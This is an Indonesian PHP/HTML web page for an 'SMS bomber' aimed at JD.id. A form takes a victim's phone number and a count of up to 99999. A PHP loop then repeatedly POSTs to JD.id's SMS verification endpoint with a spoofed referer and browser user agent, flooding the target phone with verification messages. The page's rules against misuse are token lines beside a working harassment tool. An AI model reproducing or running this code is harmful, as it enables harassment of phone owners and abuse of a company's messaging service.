<!DOCTYPE html>
<html lang="en">
<head>
<title>Official Emilia | Bom Sms Jd.id</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
</head>
<body>
    <div class="container">
        <div class="col-md-4"></div>
        <div class="col-md-4">
            <div class="formBom">
                <div class="headerForm">
                    <h2 class="text-center">BOM SMS JD.ID</h2>
                </div>
                <div class="formBody">
                    <form method="POST" action="jd.php">
                      <div class="form-group">
                        <center><label for="exampleInputEmail1"><span class="glyphicon glyphicon-earphone" aria-hidden="true"></span> No Telp</label></center>
                        <input type="text" class="form-control" name="nomer" id="exampleInputEmail1" placeholder="Nomor telepon (ex: 0858xxxxxx)">
                      </div>
                      <div class="form-group">
                        <center><label for="exampleInputPassword1">Jumlah SMS</label>
                        <input type="text" class="form-control" name="jumlah" id="exampleInputPassword1" placeholder="Jumlah (1 - 99999)"></center>
                      </div>
                      
                      <center><button type="submit" class="btn" name="BOM">BOM !</button></center>
                    </form>
                    <?php if (isset($_GET["success-bomb"])) {
                        echo "<p class='text-center' style='color:red'>SMS Terkirim!</p>";
						}?>
						<br><br>
						<center><h4>Peraturan Bom Sms</h4></center>
						<center><p>1.Sumbit Max 10sms/menit.Jika Lebih Akan Eror</p></center>
						<center><p>2.Jangan Disalahgunakan</p></center>
						<center><p>3.Gunakan Dengan Baik</p></center>
						</div>
					</div>
<br><br>
<div class="panel panel-default">
  <div class="panel-body"><center>Tanggal Dan Waktu</center>
<br><br>
                <center><div id="clock">
		<script type="text/javascript">
		<!--
		function showTime() {
		    var a_p = "";
		    var today = new Date();
		    var curr_hour = today.getHours();
		    var curr_minute = today.getMinutes();
		    var curr_second = today.getSeconds();
		    if (curr_hour < 12) {
		        a_p = "AM";
		    } else {
		        a_p = "PM";
		    }
		    if (curr_hour == 0) {
		        curr_hour = 12;
		    }
		    if (curr_hour > 12) {
		        curr_hour = curr_hour - 12;
		    }
		    curr_hour = checkTime(curr_hour);
		    curr_minute = checkTime(curr_minute);
		    curr_second = checkTime(curr_second);
		 document.getElementById('clock').innerHTML=curr_hour + ":" + curr_minute + ":" + curr_second + " " + a_p;
		    }
 
		function checkTime(i) {
		    if (i < 10) {
		        i = "0" + i;
		    }
		    return i;
		}
		setInterval(showTime, 500);
		//-->
		</script></center>
 
		<!-- Menampilkan Hari, Bulan dan Tahun -->
		<br>
		<center><script type='text/javascript'>
			<!--
			var months = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember'];
			var myDays = ['Minggu', 'Senin', 'Selasa', 'Rabu', 'Kamis', 'Jum&#39;at', 'Sabtu'];
			var date = new Date();
			var day = date.getDate();
			var month = date.getMonth();
			var thisDay = date.getDay(),
			    thisDay = myDays[thisDay];
			var yy = date.getYear();
			var year = (yy < 1000) ? yy + 1900 : yy;
			document.write(thisDay + ', ' + day + ' ' + months[month] + ' ' + year);
			//-->
		</script></div></center>
                    <br>

<center><div class='copyright'>Copyright &#169; 2018. <a href='http://official-emilia20.indoweb.xyz/index.php'>Official Emilia20</a> | powered by: <a href='https://www.instagram.com/adie192_'>Adie Dharma</a></div></center>
		</div>
</body>
</html>

<?php 
    function jdidbom($no, $jum, $wait){
    $x = 0; 
    while($x < $jum) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL,"http://sc.jd.id/phone/sendPhoneSms");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=".$no."&smsType=1");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_REFERER, 'http://sc.jd.id/phone/bindingPhone.html');
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
        $server_output = curl_exec ($ch);
        curl_close ($ch);
        echo $server_output."\n";
        sleep($wait);
        $x++;
        flush();
    }    
}

if (isset($_POST["BOM"])) {
    $nomor = $_POST['nomer'];
        $jumlah = $_POST['jumlah'];
        $jeda = "1";
        $execute = jdidbom($nomor, $jumlah, $jeda);
        echo "<p style='color:red; text-align:center;'>Sukses BOM!</p>";
}
?>